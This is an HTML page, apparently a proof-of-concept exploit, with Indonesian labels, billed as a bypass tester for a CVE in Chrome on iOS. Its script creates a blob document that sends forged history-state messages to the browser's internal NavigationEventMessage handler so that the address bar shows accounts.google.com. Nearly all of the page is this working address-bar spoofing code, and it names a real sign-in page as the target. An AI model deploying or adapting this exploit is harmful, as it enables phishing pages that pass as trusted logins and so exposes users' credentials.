<!doctype html>
<meta charset="utf-8">
<title>CVE-2026-95291 Enhanced PoC & Bypass Tester</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0f172a; color: #f8fafc; }
  .container { max-width: 700px; margin: auto; background: #1e293b; padding: 2em; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
  h2 { color: #f43f5e; margin-top: 0; }
  p { line-height: 1.5; color: #cbd5e1; }
  button { font-size: 16px; padding: 0.7em 1.4em; background: #3b82f6; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.2s; }
  button:hover { background: #2563eb; }
  #diag { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; white-space: pre-wrap; background: #0f172a; padding: 1.2em; border-radius: 6px; border: 1px solid #334155; color: #38bdf8; max-height: 300px; overflow-y: auto; }
  .badge { display: inline-block; padding: 0.25em 0.6em; font-size: 11px; font-weight: bold; border-radius: 4px; background: #475569; color: #fff; margin-bottom: 1em; }
</style>

<div class="container">
  <span class="badge">iOS Chrome Security Test</span>
  <h2>CVE-2026-95291 Stress & Mitigation Tester</h2>
  <p>Skrip ini menguji apakah fungsi validasi state history pada iOS Chrome menolak manipulasi <code>blob:</code> URL cross-origin atau jika masih ada celah fallback.</p>
  
  <div style="margin-top: 1.5em;">
    <button id="runBtn">Jalankan Uji Coba PoC</button>
  </div>
  
  <div id="diag">Status: Menunggu eksekusi...</div>
</div>

<script>
function log(msg) {
    var diag = document.getElementById('diag');
    diag.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
    diag.scrollTop = diag.scrollHeight;
    console.log('[PoC Debug] ' + msg);
}

document.getElementById('runBtn').onclick = function() {
    document.getElementById('diag').textContent = 'Memulai pengujian eksploitasi...';
    
    // Target yang ingin dispoof
    var targetVictim = 'accounts.google.com';
    var attackUrl = 'blob:https://' + targetVictim + '/signin';

    // Payload dokumen blob mandiri
    var blobPayload = `<!doctype html>
    <meta charset=utf-8>
    <title>Payload Inner View</title>
    <script>
    (function() {
        setTimeout(function() {
            var mh = window.webkit && window.webkit.messageHandlers;
            if (!mh || !mh.NavigationEventMessage) {
                parent.postMessage({status: 'BLOCKED', reason: 'NavigationEventMessage handler tidak ditemukan (Bukan iOS Chrome atau sudah diamankan).'}, '*');
                return;
            }
            
            var frameId = null;
            try {
                frameId = window.__gCrWeb && window.__gCrWeb.getFrameId();
            } catch(e) {}

            if (!frameId) {
                parent.postMessage({status: 'BLOCKED', reason: 'Gagal mengambil frame_id dari page-world __gCrWeb.'}, '*');
                return;
            }

            try {
                // Mengirimkan perintah palsu untuk memicu validasi IsHistoryStateChangeValid
                mh.NavigationEventMessage.postMessage({ command: 'willChangeState', frame_id: frameId });
                mh.NavigationEventMessage.postMessage({ 
                    command: 'didReplaceState', 
                    frame_id: frameId, 
                    stateObject: '', 
                    baseUrl: 'https://validator-test.local/', 
                    pageUrl: '${attackUrl}' 
                });
                parent.postMessage({status: 'SENT', reason: 'Pesan terkirim. Perhatikan apakah address bar berubah menjadi ${targetVictim}.'}, '*');
            } catch(err) {
                parent.postMessage({status: 'ERROR', reason: 'Pengecualian saat postMessage: ' + err.message}, '*');
            }
        }, 300);
    })();
    <\/script>`;

    try {
        var blobObj = new Blob([blobPayload], {type: 'text/html'});
        var blobLink = URL.createObjectURL(blobObj);

        // Listener untuk menerima status dari dokumen blob
        var messageListener = function(event) {
            if (event.data && event.data.status) {
                log('Hasil Pengujian: ' + event.data.status);
                log('Detail: ' + event.data.reason);
                window.removeEventListener('message', messageListener);
            }
        };
        window.addEventListener('message', messageListener);

        log('Membuat objek blob dan melakukan navigasi ke: ' + blobLink);
        
        // Eksekusi navigasi mandiri ke blob URL
        setTimeout(function() {
            location.href = blobLink;
        }, 500);

    } catch (e) {
        log('Gagal menginisialisasi blob: ' + e.message);
    }
};
</script>
